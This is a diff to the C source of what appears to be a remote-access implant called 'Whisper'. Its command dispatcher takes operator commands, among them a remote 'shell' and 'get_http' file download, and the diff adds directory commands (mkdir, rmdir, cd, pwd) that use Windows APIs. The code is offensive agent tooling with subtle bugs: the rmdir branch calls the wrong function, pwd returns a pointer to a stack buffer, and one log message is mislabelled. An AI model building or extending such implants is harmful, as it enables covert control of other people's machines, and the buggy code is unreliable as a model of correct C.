@@ -1,7 +1,7 @@
 #pragma once
 
 #include <stdio.h>
-
+#include <windows.h>
 #include "type_conversions.h"
 #include "whisper_config.h"
 #include "whisper_json.h"
@@ -26,6 +26,12 @@ void messagebox(OutboundJsonDataStruct*, char* args);
 void sleep(OutboundJsonDataStruct*, char* args);
 void help(OutboundJsonDataStruct*);
 
+//filesystem stuff
+void mkdir(OutboundJsonDataStruct* response_struct, char* args);
+void rmdir_win(OutboundJsonDataStruct* response_struct, char* args);
+void cd(OutboundJsonDataStruct* response_struct, char* args);
+void pwd(OutboundJsonDataStruct* response_struct);
+
 // ====================
 // Functions
 // ====================
@@ -48,22 +54,44 @@ int parse_command(char* command, char* args, OutboundJsonDataStruct* response_st
     if (strcmp(command, "whoami") == 0) {
         DEBUG_LOG("[COMMAND] whoami\n");
         get_username(response_struct);
-    } else if (strcmp(command, "shell") == 0) {
+    } 
+    else if (strcmp(command, "shell") == 0) {
         DEBUG_LOG("[COMMAND] shell\n");
         shell(response_struct, args);
-    } else if (strcmp(command, "get_http") == 0) {
+    } 
+    else if (strcmp(command, "get_http") == 0) {
         DEBUG_LOG("[COMMAND] get_http...\n");
         get_file_http(response_struct, args);
-    } else if (strcmp(command, "messagebox") == 0) {
+    } 
+    else if (strcmp(command, "messagebox") == 0) {
         DEBUG_LOG("[COMMAND] get_http...\n");
         messagebox(response_struct, args);
-    } else if (strcmp(command, "help") == 0) {
+    } 
+    else if (strcmp(command, "help") == 0) {
         DEBUG_LOG("[COMMAND] help...\n");
         help(response_struct);
-    } else if (strcmp(command, "sleep") == 0) {
+    } 
+    else if (strcmp(command, "sleep") == 0) {
         DEBUG_LOG("[COMMAND] sleep\n");
         sleep(response_struct, args);
-    } else {
+    } 
+    else if (strcmp(command, "mkdir") == 0) {
+        DEBUG_LOG("[COMMAND] mkdir\n");
+        mkdir(response_struct, args);
+    }
+    else if (strcmp(command, "cd") == 0) {
+        DEBUG_LOG("[COMMAND] cd\n");
+        cd(response_struct, args);
+    }
+    else if (strcmp(command, "rmdir") == 0) {
+        DEBUG_LOG("[COMMAND] rmdir\n");
+        rmdir(response_struct, args);
+    }
+    else if (strcmp(command, "pwd") == 0) {
+        DEBUG_LOG("[COMMAND] pwd\n");
+        pwd(response_struct);
+    }
+    else {
         DEBUG_LOG("[COMMAND] Unknown command!\n");
         response_struct->command_result_data = "Unknown command";
     }
@@ -328,6 +356,87 @@ void help(OutboundJsonDataStruct* response_struct)
 
 
 /*
+Directory Commands
+
+Need to switch to WhisperFunctions
+
+Still need some work
+
+*/
+
+
+
+/* 
+    Create a directory 
+*/
+void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL; // Required for strtok_s & thread safety.
+    char* path_arg = strtok_s(args, " ", &context);
+
+    if (CreateDirectoryA(path_arg, NULL)) {
+        DEBUG_LOG("Directory created: %s\n", path_arg);
+    } else {
+        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", GetLastError());
+    }
+}
+
+/* 
+    Remove a directory 
+*/
+void rmdir_win(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL; // Required for strtok_s & thread safety.
+    char* path_arg = strtok_s(args, " ", &context);
+
+    if (RemoveDirectoryA(path_arg)) {
+        DEBUG_LOG("Directory removed: %s\n", path_arg);
+        response_struct->command_result_data = "Directory removed";
+
+    } else {
+        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", GetLastError());
+        response_struct->command_result_data = "Directory removal failed";
+
+    }
+}
+
+/* 
+    Change directory 
+*/
+void cd(OutboundJsonDataStruct* response_struct, char* args) {
+    char* context = NULL; // Required for strtok_s & thread safety.
+    char* path_arg = strtok_s(args, " ", &context);
+    
+    if (SetCurrentDirectoryA(path_arg)) {
+        DEBUG_LOG("Changed directory to: %s\n", path_arg);
+
+        //could have a better response here, like "Current path is: path"
+        response_struct->command_result_data = path_arg;
+
+    } else {
+        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", GetLastError());
+        response_struct->command_result_data = "SetCurrentDirectory failed";
+
+    }
+}
+
+/* 
+    Get current working directory 
+*/
+void pwd(OutboundJsonDataStruct* response_struct) {
+    char cwd[MAX_PATH];
+    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
+        DEBUG_LOG("Current working directory: %s\n", cwd);
+        //not returning full dir, might have to allocate some stuff for it?
+        response_struct->command_result_data = cwd;
+
+    } else {
+        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", GetLastError());
+        response_struct->command_result_data = "GetCurrentDirectory failed";
+
+    }
+}
+
+
+/*
  Stub commands for things that can to be added for more functionality
 
 */
@@ -344,10 +453,10 @@ void help(OutboundJsonDataStruct* response_struct)
 // void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern
 
 // Directory Operations
-// void mkdir(response_struct, path) - Create a directory
-// void rmdir(response_struct, path) - Remove a directory
-// void cd(response_struct, path) - Change directory
-// void pwd(response_struct) - Get current working directory
+// [X] void mkdir(response_struct, path) - Create a directory
+// [X] void rmdir(response_struct, path) - Remove a directory
+// [X] void cd(response_struct, path) - Change directory
+// [X] void pwd(response_struct) - Get current working directory
 // void ls(response_struct, path) - List files in a directory
 
 // Process and Execution
